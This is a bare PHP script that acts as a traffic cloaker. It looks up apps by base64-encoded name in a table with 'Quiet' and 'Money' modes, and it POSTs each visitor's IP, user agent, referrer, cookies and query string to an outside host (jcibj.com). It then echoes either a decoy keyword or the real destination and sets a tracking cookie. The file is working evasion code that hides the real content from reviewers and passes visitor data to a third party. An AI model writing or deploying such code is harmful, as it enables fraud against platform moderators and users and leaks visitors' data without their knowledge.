<?php
$app_name = $_GET['apn'];
$cloaker_id =$_GET['clcr'];
$decypted_app_name = base64_decode($app_name);
$cloaker_id = base64_decode($cloaker_id);
include('config/DB.php');
if (!$app_name) {
  die;
}else{
  if ($cloaker_id) {
    $db = new DB();
    $sql = "SELECT `key_word_quiet` , `key_word_money` , `apps_money` FROM `APP_API` WHERE `id_name` = ? ";
    $params = [$decypted_app_name];
    $result = $db->query($sql,$params);
    if ($result) {
      $result = $db->fetch()[0];
      if ($result['apps_money'] == 'Quiet') {
        die;
      }
    $uid="tw3j27k4bhm99oldqdu5cx9ww";
    $qu=$_SERVER["QUERY_STRING"];
    $ch = curl_init();
    $url = "http://jcibj.com/pcl.php";
    $data =array("lan"=>$_SERVER["HTTP_ACCEPT_LANGUAGE"],"ref"=>$_SERVER["HTTP_REFERER"],"ip"=>$_SERVER["REMOTE_ADDR"],"ipr"=>$_SERVER["HTTP_X_FORWARDED_FOR"],"sn"=>$_SERVER["SERVER_NAME"],"query"=>$qu,"ua"=>$_SERVER["HTTP_USER_AGENT"],"co"=>$_COOKIE["cl"],"user_id"=>$uid,"id"=>$cloaker_id);
    curl_setopt($ch,CURLOPT_URL, $url);
    curl_setopt($ch,CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch,CURLOPT_POST, true);
    curl_setopt($ch,CURLOPT_POSTFIELDS, $data);
    $result = curl_exec($ch);
    curl_close($ch);
    $arr = explode(",",$result);
    if(!empty($qu)){
      if(strpos($arr[1],"?")){
        $q="&".$qu;
    }else{
      $q="?".$qu;
    }
   }else{
     $q="";
    }
    if($arr[0] === "true"){
      if(strstr($arr[1],"sp.php")){
        $q="";
    }
    if($arr[2]){
      if($arr[4] == 1 OR $arr[4] == 3){
        setcookie("cl",$decypted_app_name,time()+60*60*24*$arr[3]);
    }
   }
   echo $arr[1];
   }elseif($arr[0] === "false"){if($arr[2]){if($arr[4] == 2 OR $arr[4] == 3){
     setcookie("cl",$decypted_app_name,time()+60*60*24*$arr[3]);
    }
   }
   echo $arr[1];
   }else{
     if($arr[2]){
       if($arr[4] == 2 OR $arr[4] == 3){
         setcookie("cl",$decypted_app_name,time()+60*60*24*$arr[3]);
       }
     }
   }
}
  }else{

  $db = new DB();
  $sql = "SELECT `key_word_quiet` , `key_word_money` , `apps_money` FROM `APP_API` WHERE `id_name` = ? ";
  $params = [$decypted_app_name];
  $result = $db->query($sql,$params);
  if ($result) {
    $result = $db->fetch()[0];
    if ($result['apps_money'] == 'Quiet') {
      echo $result['key_word_quiet'];die;
    }elseif ($result['apps_money'] == 'Money') {
      echo $result['key_word_money'];die;
    }else{
      die;
    }
  }
}
}

 ?>
